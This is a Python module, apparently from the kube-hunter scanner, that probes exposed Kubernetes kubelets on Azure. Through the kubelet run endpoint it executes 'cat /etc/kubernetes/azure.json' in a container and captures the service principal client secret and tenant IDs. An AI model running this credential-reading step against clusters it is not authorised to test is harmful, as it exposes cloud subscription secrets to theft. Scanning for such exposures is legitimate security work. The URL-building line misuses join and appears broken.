import json
import logging
import requests

from kube_hunter.conf import get_config
from kube_hunter.modules.hunting.kubelet import ExposedRunHandler
from kube_hunter.core.events import handler
from kube_hunter.core.events.types import Event, Vulnerability
from kube_hunter.core.types import Hunter, ActiveHunter, IdentityTheft, Azure

logger = logging.getLogger(__name__)


class AzureSpnExposure(Vulnerability, Event):
    """The SPN is exposed, potentially allowing an attacker to gain access to the Azure subscription"""

    def __init__(self, container):
        Vulnerability.__init__(
            self,
            Azure,
            "Azure SPN Exposure",
            category=IdentityTheft,
            vid="KHV004",
        )
        self.container = container


@handler.subscribe(ExposedRunHandler, predicate=lambda x: x.cloud == "Azure")
class AzureSpnHunter(Hunter):
    """AKS Hunting
    Hunting Azure cluster deployments using specific known configurations
    """

    def __init__(self, event):
        self.event = event
        self.base_url = f"https://{self.event.host}:{self.event.port}"

    # getting a container that has access to the azure.json file
    def get_key_container(self):
        config = get_config()
        endpoint = f"{self.base_url}/pods"
        logger.debug("Trying to find container with access to azure.json file")
        try:
            r = requests.get(endpoint, verify=False, timeout=config.network_timeout)
        except requests.Timeout:
            logger.debug("failed getting pod info")
        else:
            pods_data = r.json().get("items", [])
            suspicious_volume_names = []
            for pod_data in pods_data:
                for volume in pod_data["spec"].get("volumes", []):
                    if volume.get("hostPath"):
                        path = volume["hostPath"]["path"]
                        if "/etc/kubernetes/azure.json".startswith(path):
                            suspicious_volume_names.append(volume["name"])
                for container in pod_data["spec"]["containers"]:
                    for mount in container.get("volumeMounts", []):
                        if mount["name"] in suspicious_volume_names:
                            return {
                                "name": container["name"],
                                "pod": pod_data["metadata"]["name"],
                                "namespace": pod_data["metadata"]["namespace"],
                            }

    def execute(self):
        container = self.get_key_container()
        if container:
            self.publish_event(AzureSpnExposure(container=container))


@handler.subscribe(AzureSpnExposure)
class ProveAzureSpnExposure(ActiveHunter):
    """Azure SPN Hunter
    Gets the azure subscription file on the host by executing inside a container
    """

    def __init__(self, event):
        self.event = event
        self.base_url = f"https://{self.event.host}:{self.event.port}"

    def run(self, command, container):
        config = get_config()
        run_url = "/".join(self.base_url, "run", container["namespace"], container["pod"], container["name"])
        return requests.post(run_url, verify=False, params={"cmd": command}, timeout=config.network_timeout)

    def execute(self):
        try:
            subscription = self.run("cat /etc/kubernetes/azure.json", container=self.event.container).json()
        except requests.Timeout:
            logger.debug("failed to run command in container", exc_info=True)
        except json.decoder.JSONDecodeError:
            logger.warning("failed to parse SPN")
        else:
            if "subscriptionId" in subscription:
                self.event.subscriptionId = subscription["subscriptionId"]
                self.event.aadClientId = subscription["aadClientId"]
                self.event.aadClientSecret = subscription["aadClientSecret"]
                self.event.tenantId = subscription["tenantId"]
                self.event.evidence = f"subscription: {self.event.subscriptionId}"
